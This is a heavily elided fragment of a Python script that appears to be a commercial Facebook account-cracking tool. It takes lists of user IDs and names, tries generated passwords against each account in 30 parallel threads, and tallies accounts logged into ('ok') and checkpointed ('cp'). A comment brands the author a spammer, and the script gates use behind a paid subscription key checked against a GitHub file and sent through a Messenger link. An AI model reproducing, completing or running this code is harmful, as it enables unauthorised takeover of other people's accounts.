...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;92m[RAKIB] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Mr.RAKIB BANGLADESH SPAMMER
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
...
def bnsbuy():
    ...
    if to in r:
        ...
        os.system('am start https://m.me/innocent.devil.KAUSAR.143?text=' + tks)
...
def Subscraption():
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/MRRAKIB-404/Robiul/blob/main/robiul_appro.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
